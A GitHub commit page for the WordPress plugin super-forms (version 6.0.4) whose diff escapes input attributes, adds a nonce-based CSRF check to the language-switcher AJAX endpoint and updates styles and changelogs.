=== Content from github.com_b2d9b933_20250115_084641.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRensTillmann%2Fsuper-forms%2Fcommit%2Fc19d65abbe43d9b6359c1bf3498dc697d0c19d02)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRensTillmann%2Fsuper-forms%2Fcommit%2Fc19d65abbe43d9b6359c1bf3498dc697d0c19d02)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=RensTillmann%2Fsuper-forms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RensTillmann](/RensTillmann)
/
**[super-forms](/RensTillmann/super-forms)**
Public

* [Notifications](/login?return_to=%2FRensTillmann%2Fsuper-forms) You must be signed in to change notification settings
* [Fork
  14](/login?return_to=%2FRensTillmann%2Fsuper-forms)
* [Star
   18](/login?return_to=%2FRensTillmann%2Fsuper-forms)

* [Code](/RensTillmann/super-forms)
* [Issues
  1](/RensTillmann/super-forms/issues)
* [Pull requests
  1](/RensTillmann/super-forms/pulls)
* [Discussions](/RensTillmann/super-forms/discussions)
* [Actions](/RensTillmann/super-forms/actions)
* [Projects
  0](/RensTillmann/super-forms/projects)
* [Security](/RensTillmann/super-forms/security)
* [Insights](/RensTillmann/super-forms/pulse)

Additional navigation options

* [Code](/RensTillmann/super-forms)
* [Issues](/RensTillmann/super-forms/issues)
* [Pull requests](/RensTillmann/super-forms/pulls)
* [Discussions](/RensTillmann/super-forms/discussions)
* [Actions](/RensTillmann/super-forms/actions)
* [Projects](/RensTillmann/super-forms/projects)
* [Security](/RensTillmann/super-forms/security)
* [Insights](/RensTillmann/super-forms/pulse)

## Commit

[Permalink](/RensTillmann/super-forms/commit/c19d65abbe43d9b6359c1bf3498dc697d0c19d02)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix PHP parse error

[Browse files](/RensTillmann/super-forms/tree/c19d65abbe43d9b6359c1bf3498dc697d0c19d02)
Browse the repository at this point in the history

* Loading branch information

[![@RensTillmann](https://avatars.githubusercontent.com/u/16322803?s=40&v=4)](/RensTillmann)

[RensTillmann](/RensTillmann/super-forms/commits?author=RensTillmann "View all commits by RensTillmann")
committed
Jan 27, 2022

1 parent
[bc4a762](/RensTillmann/super-forms/commit/bc4a7623490d879c8ba21857b349c242d10b6ffb)

commit c19d65a

 Show file tree

 Hide file tree

Showing
**14 changed files**
with
**192 additions**
and
**83 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* docs

  + docs/changelog.md
    [changelog.md](#diff-77f023b99d3d58008351d3e82fc06e6d06ba1bc2da9e41be6329b7fa4f419f05)
* src

  + add-ons/super-forms-register-login

    - src/add-ons/super-forms-register-login/super-forms-register-login.php
      [super-forms-register-login.php](#diff-01bb6b829b3b97d99be9b62d1e8b29b7de98bd76286bb4e1ae6513e596eef44c)
  + assets

    - css/frontend

      * src/assets/css/frontend/elements.css
        [elements.css](#diff-2b45de102b052bffb09988debe6b883d2f961464c29d8193d6d3912ca2475252)
      * src/assets/css/frontend/elements.css.map
        [elements.css.map](#diff-70948237dc68fe03b20a0c11964d2ba3a2cfa24bf2fdf1fdf3b6b0fe4d0a0454)
      * src/assets/css/frontend/elements.sass
        [elements.sass](#diff-47eaec3a5828fc4d51422d4e238b1d69358c3e384ad055b609ba068568fc7668)
    - js

      * src/assets/js/common.js
        [common.js](#diff-f3097a6a77b95c21c6ed4045b656b5782738e879a1d0a41e6826ae4967540fc1)
      * frontend

        + src/assets/js/frontend/elements.js
          [elements.js](#diff-9dff09e9b321f754147274943b28903f8ccb767d80f04312bc8b82394d67b895)
  + docs

    - src/docs/changelog.md
      [changelog.md](#diff-c422e60aaf32fd18a0afd92c27e606cfb478dce293da34661c1c4c2cdebb8de2)
  + includes

    - src/includes/class-ajax.php
      [class-ajax.php](#diff-4350955555c1fe792601ea46403e859f3d561bfa87c284513f7ff0b6b41854a2)
    - src/includes/class-common.php
      [class-common.php](#diff-29a5435f84cbc878aa03c0062e66bca7875f240ead89e6c45bb2aa35db88e19c)
    - src/includes/class-shortcodes.php
      [class-shortcodes.php](#diff-d5f612716430a51525b3bcfa91a701af80ba482a60d7b6d681deffc044e618ee)
    - extensions/listings

      * src/includes/extensions/listings/listings.php
        [listings.php](#diff-b1018aa3bb9c25bef1c398deef6bbc3e315ac2b1a13e02f0504983e4f61897ea)
    - sessions

      * src/includes/sessions/class-recursive-arrayaccess.php
        [class-recursive-arrayaccess.php](#diff-daad8f78dc995503ebc11096d0ff620974e854f1fc67f631f839909893e227ad)
  + src/super-forms.php
    [super-forms.php](#diff-baf4ac574499df437bb24941c1f199f9ed91375d36a6aad40f459f41ba0748c2)

## There are no files selected for viewing

7 changes: 7 additions & 0 deletions

7
[docs/changelog.md](#diff-77f023b99d3d58008351d3e82fc06e6d06ba1bc2da9e41be6329b7fa4f419f05 "docs/changelog.md")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/docs/changelog.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -8,6 +8,13 @@ |
|  |  |  |
|  |  | - [PDF Generator Add-on](https://renstillmann.github.io/super-forms/#/pdf-generator-add-on) |
|  |  |  |
|  |  | ## Jan 26, 2022 - Version 6.0.4 |
|  |  |  |
|  |  | - \*\*Fix:\*\* When `editing` is enabled for a `Listings` (Listings Add-on) make sure the styles/scripts are loaded so that normal form functions and styles are applied |
|  |  | - \*\*Fix:\*\* Validate requests made to switch form language by using a custom nonce system |
|  |  | - \*\*Fix:\*\* PHP parse error when loading a php file used for PHP versions below v8 |
|  |  |  |
|  |  |  |
|  |  | ## Jan 24, 2022 - Version 6.0.3 |
|  |  |  |
|  |  | - \*\*Fix:\*\* Option `Delete files from server after the form was submitted` wasn't working properly when storing files outside site root (secure file uploads) |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/add-ons/super-forms-register-login/super-forms-register-login.php](#diff-01bb6b829b3b97d99be9b62d1e8b29b7de98bd76286bb4e1ae6513e596eef44c "src/add-ons/super-forms-register-login/super-forms-register-login.php")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/add-ons/super-forms-register-login/super-forms-register-login.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -544,7 +544,7 @@ public static function activation\_code($x) { |
|  |  | $result = SUPER\_Shortcodes::opening\_tag( $tag, $atts ); |
|  |  | $result .= SUPER\_Shortcodes::opening\_wrapper( $atts, $inner, $shortcodes, $settings ); |
|  |  | $result .= '<input class="super-shortcode-field" type="text"'; |
|  |  | $result .= ' name="' . $atts['name'] . '" value="' . $code . '"'; |
|  |  | $result .= ' name="' . esc\_attr($atts['name']) . '" value="' . esc\_attr($code) . '"'; |
|  |  | $result .= SUPER\_Shortcodes::common\_attributes( $atts, $tag ); |
|  |  | $result .= ' />'; |
|  |  | $result .= '</div>'; |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[src/assets/css/frontend/elements.css](#diff-2b45de102b052bffb09988debe6b883d2f961464c29d8193d6d3912ca2475252 "src/assets/css/frontend/elements.css")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/assets/css/frontend/elements.css)
Edit file

Delete file

Load diff

Some generated files are not rendered by default. Learn more about [how customized files appear on GitHub](https://docs.github.com/github/administering-a-repository/customizing-how-changed-files-appear-on-github).

Oops, something went wrong.

Retry

2 changes: 1 addition & 1 deletion

2
[src/assets/css/frontend/elements.css.map](#diff-70948237dc68fe03b20a0c11964d2ba3a2cfa24bf2fdf1fdf3b6b0fe4d0a0454 "src/assets/css/frontend/elements.css.map")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/assets/css/frontend/elements.css.map)
Edit file

Delete file

Load diff

Large diffs are not rendered by default.

Oops, something went wrong.

Retry

4 changes: 4 additions & 0 deletions

4
[src/assets/css/frontend/elements.sass](#diff-47eaec3a5828fc4d51422d4e238b1d69358c3e384ad055b609ba068568fc7668 "src/assets/css/frontend/elements.sass")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/assets/css/frontend/elements.sass)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2671,9 +2671,13 @@ textarea |
|  |  | align-items: center |
|  |  | pointer-events: none |
|  |  | z-index: 2 |
|  |  | overflow: initial |
|  |  | margin: 0 |
|  |  | > span |
|  |  | margin-left: -5px |
|  |  | margin-top: -1px |
|  |  | margin-top: 0 |
|  |  | margin-bottom: 0 |
|  |  | padding: 0px 5px 0px 5px |
|  |  | line-height: normal |
|  |  | .super-textarea |
| Expand Down | |  |

21 changes: 14 additions & 7 deletions

21
[src/assets/js/common.js](#diff-f3097a6a77b95c21c6ed4045b656b5782738e879a1d0a41e6826ae4967540fc1 "src/assets/js/common.js")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/assets/js/common.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -182,9 +182,6 @@ function SUPERreCaptcha(){ |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | // @since 4.6.0 - Send ajax nonce |
|  |  | args.super\_ajax\_nonce = args.form.find('input[name="super\_ajax\_nonce"]').val(); |
|  |  |  |
|  |  | // @since 2.9.0 - json data POST |
|  |  | json\_data = JSON.stringify(args.data); |
|  |  | args.form.find('textarea[name="json\_data"]').val(json\_data); |
| Expand Down  Expand Up | | @@ -315,6 +312,7 @@ function SUPERreCaptcha(){ |
|  |  | if(args.form\_id) args.formData.append('form\_id', args.form\_id); |
|  |  | if(args.entry\_id) args.formData.append('entry\_id', args.entry\_id); |
|  |  | if(args.list\_id) args.formData.append('list\_id', args.list\_id); |
|  |  | if(args.sf\_nonce) args.formData.append('sf\_nonce', args.sf\_nonce); |
|  |  | $.ajax({ |
|  |  | type: 'post', |
|  |  | url: super\_common\_i18n.ajaxurl, |
| Expand Down  Expand Up | | @@ -2857,7 +2855,6 @@ function SUPERreCaptcha(){ |
|  |  | } |
|  |  | }else{ |
|  |  | // We do not want to display a thank you message, but might want to display a Download PDF button |
|  |  |  |
|  |  | if(args.generatePdf && args.pdfSettings.downloadBtn==='true'){ |
|  |  | args.loadingOverlay.classList.add('super-success'); |
|  |  | SUPER.show\_pdf\_download\_btn(args); |
| Expand Down  Expand Up | | @@ -3393,6 +3390,7 @@ function SUPERreCaptcha(){ |
|  |  | entry\_id: formData.entry\_id, |
|  |  | list\_id: formData.list\_id, |
|  |  | oldHtml: oldHtml, |
|  |  | sf\_nonce: formData.sf\_nonce |
|  |  | }; |
|  |  | args.callback = function(){ |
|  |  | SUPER.complete\_submit(args); |
| Expand Down  Expand Up | | @@ -4138,9 +4136,14 @@ function SUPERreCaptcha(){ |
|  |  | // When editing entry via Listings add-on |
|  |  | if($form.find('input[name="hidden\_list\_id"]').length !== 0) { |
|  |  | $list\_id = $form.find('input[name="hidden\_list\_id"]').val(); |
|  |  | //SUPER.form\_js[$form\_id].\_pdf.generate = 'false'; |
|  |  | } |
|  |  | return {data:$data, form\_id:$form\_id, entry\_id:$entry\_id, list\_id:$list\_id}; |
|  |  | return { |
|  |  | data:$data, |
|  |  | form\_id:$form\_id, |
|  |  | entry\_id:$entry\_id, |
|  |  | list\_id:$list\_id, |
|  |  | sf\_nonce: $form.find('input[name="sf\_nonce"]').val() |
|  |  | }; |
|  |  | }; |
|  |  |  |
|  |  | // @since 1.3 |
| Expand Down  Expand Up | | @@ -8056,10 +8059,10 @@ function SUPERreCaptcha(){ |
|  |  | args.loadingOverlay.querySelector('.super-inner-text').innerHTML = '<span>'+super\_common\_i18n.loadingOverlay.processing+'</span>'; |
|  |  | var formData = new FormData(); |
|  |  | formData.append('action', 'super\_submit\_form'); |
|  |  | if(args.super\_ajax\_nonce) formData.append('super\_ajax\_nonce', args.super\_ajax\_nonce); |
|  |  | if(args.form\_id) formData.append('form\_id', args.form\_id); |
|  |  | if(args.entry\_id) formData.append('entry\_id', args.entry\_id); |
|  |  | if(args.list\_id) formData.append('list\_id', args.list\_id); |
|  |  | if(args.sf\_nonce) formData.append('sf\_nonce', args.sf\_nonce); |
|  |  | if(args.token) formData.append('token', args.token); |
|  |  | if(args.version) formData.append('version', args.version); |
|  |  | if(args.data) formData.append('data', JSON.stringify(args.data)); |
| Expand Down  Expand Up | | @@ -8097,6 +8100,10 @@ function SUPERreCaptcha(){ |
|  |  | // Display error message |
|  |  | SUPER.form\_submission\_finished(args, result); |
|  |  | }else{ |
|  |  | // Update new nonce |
|  |  | if(result.response\_data && result.response\_data.sf\_nonce){ |
|  |  | $('input[name="sf\_nonce"]').val(result.response\_data.sf\_nonce); |
|  |  | } |
|  |  | // Clear form progression (if enabled) |
|  |  | if( args.form[0].classList.contains('super-save-progress') ) { |
|  |  | $.ajax({ |
| Expand Down | |  |

108 changes: 69 additions & 39 deletions

108
[src/assets/js/frontend/elements.js](#diff-9dff09e9b321f754147274943b28903f8ccb767d80f04312bc8b82394d67b895 "src/assets/js/frontend/elements.js")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/assets/js/frontend/elements.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -1274,7 +1274,7 @@ |
|  |  | // Update conditional logic names |
|  |  | // Update validate condition names |
|  |  | // Update variable condition names |
|  |  | var nodes = clone.querySelectorAll('.super-conditional-logic, .super-validate-conditions, .super-variable-conditions'); |
|  |  | nodes = clone.querySelectorAll('.super-conditional-logic, .super-validate-conditions, .super-variable-conditions'); |
|  |  | for(i=0; i<nodes.length; ++i){ |
|  |  | // Before we continue replace any foreach(file\_upload\_fieldname) |
|  |  | var regex = /{([-\_a-zA-Z0-9]{1,})(\[.\*?\])?(\_\d{1,})?(?:;([a-zA-Z0-9]{1,}))?}/g; |
| Expand Down  Expand Up | | @@ -1309,7 +1309,7 @@ |
|  |  | if(childParentIndex!==0){ |
|  |  | delete suffix[0]; |
|  |  | } |
|  |  | var levels = suffix.reverse().join(''); |
|  |  | levels = suffix.reverse().join(''); |
|  |  | if(childParentIndex!==0){ |
|  |  | replaceTagsWithValue[$o] = '{'+$n+levels+'\_'+(childParentIndex+1)+$s+'}'; |
|  |  | continue; |
| Expand Down  Expand Up | | @@ -2667,52 +2667,82 @@ |
|  |  |  |
|  |  | // Switch to different language when clicked |
|  |  | if(field.closest('.super-i18n-switcher')){ |
|  |  | var $this = $(this), |
|  |  | $form = $this.closest('.super-form'), |
|  |  | $form\_id = $form.find('input[name="hidden\_form\_id"]').val(), |
|  |  | $i18n = $this.attr('data-value'); |
|  |  |  |
|  |  | $this.parent().children('.super-item').removeClass('super-active'); |
|  |  | $this.addClass('super-active'); |
|  |  | // Also move to placeholder |
|  |  | $this.parents('.super-dropdown').children('.super-dropdown-placeholder').html($this.html()); |
|  |  |  |
|  |  | // Generate new nonce |
|  |  | var $this = $(this), $form = $this.closest('.super-form'); |
|  |  | // Remove initialized class |
|  |  | $form.find('form').html(''); |
|  |  | $form.find('.super-button').remove(); |
|  |  | $form.removeClass('super-initialized'); |
|  |  |  |
|  |  | // Get URL parameters |
|  |  | var $queryString = window.location.search; |
|  |  | var $parameters = SUPER.getAllUrlParams($queryString); |
|  |  | $.ajax({ |
|  |  | url: super\_elements\_i18n.ajaxurl, |
|  |  | type: 'post', |
|  |  | data: { |
|  |  | action: 'super\_language\_switcher', |
|  |  | form\_id: $form\_id, |
|  |  | i18n: $i18n, |
|  |  | parameters: $parameters |
|  |  | $.ajax({ |
|  |  | url: super\_elements\_i18n.ajaxurl, |
|  |  | type: 'post', |
|  |  | data: { |
|  |  | action: 'super\_create\_nonce' |
|  |  | }, |
|  |  | success: function (result) { |
|  |  | var data = JSON.parse(result); |
|  |  | if(data.rtl==true){ |
|  |  | $form.addClass('super-rtl'); |
|  |  | }else{ |
|  |  | $form.removeClass('super-rtl'); |
|  |  | } |
|  |  | $form.find('form').html(data.html); |
|  |  | $form.data('i18n', $i18n); |
|  |  | success: function (nonce) { |
|  |  | $form.find('input[name="sf\_nonce"]').val(nonce); |
|  |  | }, |
|  |  | complete: function(){ |
|  |  | $form.removeClass('super-initialized'); |
|  |  | $form.removeClass('super-rendered'); |
|  |  | $form.find('.super-multipart-progress').remove(); |
|  |  | $form.find('.super-multipart-steps').remove(); |
|  |  | var $form\_id = $form.find('input[name="hidden\_form\_id"]').val(), |
|  |  | $sf\_nonce = $form.find('input[name="sf\_nonce"]').val(), |
|  |  | $i18n = $this.attr('data-value'); |
|  |  |  |
|  |  | $this.parent().children('.super-item').removeClass('super-active'); |
|  |  | $this.addClass('super-active'); |
|  |  | // Also move to placeholder |
|  |  | $this.parents('.super-dropdown').children('.super-dropdown-placeholder').html($this.html()); |
|  |  |  |
|  |  | // Get URL parameters |
|  |  | var $queryString = window.location.search; |
|  |  | var $parameters = SUPER.getAllUrlParams($queryString); |
|  |  | $.ajax({ |
|  |  | url: super\_elements\_i18n.ajaxurl, |
|  |  | type: 'post', |
|  |  | data: { |
|  |  | action: 'super\_language\_switcher', |
|  |  | form\_id: $form\_id, |
|  |  | i18n: $i18n, |
|  |  | parameters: $parameters, |
|  |  | sf\_nonce: $sf\_nonce, |
|  |  | }, |
|  |  | success: function (result) { |
|  |  | var data = JSON.parse(result); |
|  |  | if(data.error && data.error===true){ |
|  |  | var i, nodes = document.querySelectorAll('.super-msg'); |
|  |  | for (i = 0; i < nodes.length; i++) { |
|  |  | nodes[i].remove(); |
|  |  | } |
|  |  | var $html = '<div class="super-msg super-error">'; |
|  |  | $html += data.msg; |
|  |  | $html += '<span class="super-close"></span>'; |
|  |  | $html += '</div>'; |
|  |  | $($html).prependTo($form); |
|  |  | }else{ |
|  |  | if(data.rtl==true){ |
|  |  | $form.addClass('super-rtl'); |
|  |  | }else{ |
|  |  | $form.removeClass('super-rtl'); |
|  |  | } |
|  |  | $form.find('form').html(data.html); |
|  |  | $form.data('i18n', $i18n); |
|  |  | } |
|  |  | }, |
|  |  | complete: function(){ |
|  |  | $form.removeClass('super-initialized'); |
|  |  | $form.removeClass('super-rendered'); |
|  |  | $form.find('.super-multipart-progress').remove(); |
|  |  | $form.find('.super-multipart-steps').remove(); |
|  |  | }, |
|  |  | error: function (xhr, ajaxOptions, thrownError) { |
|  |  | // eslint-disable-next-line no-console |
|  |  | console.log(xhr, ajaxOptions, thrownError); |
|  |  | alert(super\_elements\_i18n.failed\_to\_process\_data); |
|  |  | } |
|  |  | }); |
|  |  | }, |
|  |  | error: function (xhr, ajaxOptions, thrownError) { |
|  |  | // eslint-disable-next-line no-console |
|  |  | console.log(xhr, ajaxOptions, thrownError); |
|  |  | alert(super\_elements\_i18n.failed\_to\_process\_data); |
|  |  | alert('Failed to generate nonce!'); |
|  |  | } |
|  |  | }); |
|  |  | return true; |
| Expand Down | |  |

7 changes: 7 additions & 0 deletions

7
[src/docs/changelog.md](#diff-c422e60aaf32fd18a0afd92c27e606cfb478dce293da34661c1c4c2cdebb8de2 "src/docs/changelog.md")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/docs/changelog.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -8,6 +8,13 @@ |
|  |  |  |
|  |  | - [PDF Generator Add-on](https://renstillmann.github.io/super-forms/#/pdf-generator-add-on) |
|  |  |  |
|  |  | ## Jan 26, 2022 - Version 6.0.4 |
|  |  |  |
|  |  | - \*\*Fix:\*\* When `editing` is enabled for a `Listings` (Listings Add-on) make sure the styles/scripts are loaded so that normal form functions and styles are applied |
|  |  | - \*\*Fix:\*\* Validate requests made to switch form language by using a custom nonce system |
|  |  | - \*\*Fix:\*\* PHP parse error when loading a php file used for PHP versions below v8 |
|  |  |  |
|  |  |  |
|  |  | ## Jan 24, 2022 - Version 6.0.3 |
|  |  |  |
|  |  | - \*\*Fix:\*\* Option `Delete files from server after the form was submitted` wasn't working properly when storing files outside site root (secure file uploads) |
| Expand Down | |  |

66 changes: 45 additions & 21 deletions

66
[src/includes/class-ajax.php](#diff-4350955555c1fe792601ea46403e859f3d561bfa87c284513f7ff0b6b41854a2 "src/includes/class-ajax.php")

Show comments

[View file](/RensTillmann/super-forms/blob/c19d65abbe43d9b6359c1bf3498dc697d0c19d02/src/includes/class-ajax.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -42,8 +42,9 @@ public static function init() { |
|  |  | 'load\_preview' => false, |
|  |  | 'switch\_language' => false, // @since 4.7.0 |
|  |  |  |
|  |  | 'upload\_files' => true, |
|  |  | 'submit\_form' => true, |
|  |  | 'create\_nonce' => true, |
|  |  | 'upload\_files' => true, |
|  |  | 'submit\_form' => true, |
|  |  | 'language\_switcher' => true, // @since 4.7.0 |
|  |  |  |
|  |  | 'load\_default\_settings' => false, |
| Expand Down  Expand Up | | @@ -112,7 +113,10 @@ public static function init() { |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | public static function create\_nonce(){ |
|  |  | echo SUPER\_Common::generate\_nonce(); |
|  |  | die(); |
|  |  | } |
|  |  | public static function listings\_view\_entry(){ |
|  |  | require\_once( SUPER\_PLUGIN\_DIR . '/includes/class-common.php' ); |
|  |  | require\_once( SUPER\_PLUGIN\_DIR . '/includes/extensions/listings/form-blank-page-template.php' ); |
| Expand Down  Expand Up | | @@ -358,18 +362,38 @@ public static function update\_unique\_code() { |
|  |  | public static function language\_switcher() { |
|  |  | $atts = array( |
|  |  | 'id' => absint($\_POST['form\_id']), |
|  |  | 'i18n' => sanitize\_text\_field($\_POST['i18n']), |
|  |  | 'parameters' => $\_POST['parameters'] |
|  |  | 'i18n' => (isset($\_POST['i18n']) ? sanitize\_text\_field($\_POST['i18n']) : ''), |
|  |  | 'parameters' => (isset($\_POST['parameters']) ? $\_POST['parameters'] : array()), |
|  |  | ); |
|  |  | // Check if languages are used |
|  |  | $verified = true; |
|  |  | $settings = SUPER\_Common::get\_form\_settings($atts['id']); |
|  |  | if(empty($settings['i18n\_switch'])) $settings['i18n\_switch'] = 'false'; |
|  |  | if($settings['i18n\_switch']!=='true'){ |
|  |  | // No need to do this, return message |
|  |  | $verified = false; |
|  |  | } |
|  |  | $translations = SUPER\_Common::get\_form\_translations($atts['id']); |
|  |  | if( (!is\_array($translations)) || ((is\_array($translations)) && (count($translations)<2)) ) { |
|  |  | // No need to do this, return message |
|  |  | $verified = false; |
|  |  | } |
|  |  | $csrfValidation = SUPER\_Common::verifyCSRF(); |
|  |  | if(!$csrfValidation){ |
|  |  | $verified = false; |
|  |  | } |
|  |  | if($verified===false){ |
|  |  | SUPER\_Common::output\_message( |
|  |  | $error = true, |
|  |  | esc\_html\_\_( 'Unable to switch language, session expired!', 'super-forms' ) |
|  |  | ); |
|  |  | } |
|  |  | // @since 4.7.0 - translation RTL |
|  |  | // check if the translation has enable RTL mode |
|  |  | $rtl = false; |
|  |  | $translations = SUPER\_Common::get\_form\_translations($atts['id']); |
|  |  | if(is\_array($translations)){ |
|  |  | if( !empty($translations[$atts['i18n']]) && !empty($translations[$atts['i18n']]['rtl']) ){ |
|  |  | if($translations[$atts['i18n']]['rtl']=='true'){ |
|  |  | $rtl = true; |
|  |  | } |
|  |  | if(!empty($translations[$atts['i18n']]) && !empty($translations[$atts['i18n']]['rtl'])){ |
|  |  | if($translations[$atts['i18n']]['rtl']=='true'){ |
|  |  | $rtl = true; |
|  |  | } |
|  |  | } |
|  |  | // This will grab only the elements of the form. We can then return it and add it inside the <form> tag |
| Expand Down  Expand Up | | @@ -2408,16 +2432,6 @@ public static function submit\_form\_checks( $settings=null ) { |
|  |  | $list\_id = (isset($\_POST['list\_id']) ? absint($\_POST['list\_id']) : ''); |
|  |  | $settings = apply\_filters( 'super\_before\_submit\_form\_settings\_filter', $settings, array( 'data'=>$data, 'post'=>$\_POST, 'entry\_id'=>$entry\_id, 'list\_id'=>$list\_id ) ); |
|  |  |  |
|  |  | // Temporarily deprecated till found a solution with caching plugins |
|  |  | // // @since 4.6.0 - Check if ajax request is valid based on nonce field |
|  |  | // if ( !wp\_verify\_nonce( $\_POST['super\_ajax\_nonce'], 'super\_submit\_' . $form\_id ) ) { |
|  |  | // SUPER\_Common::output\_message( |
|  |  | // $error = true, |
|  |  | // esc\_html\_\_( 'Failed to verify nonce! You either do not have permission to submit this form or caching is enabled. If caching is enabled make sure to exclude this page from being cached.', 'super-forms' ) |
|  |  | // ); |
|  |  | // } |
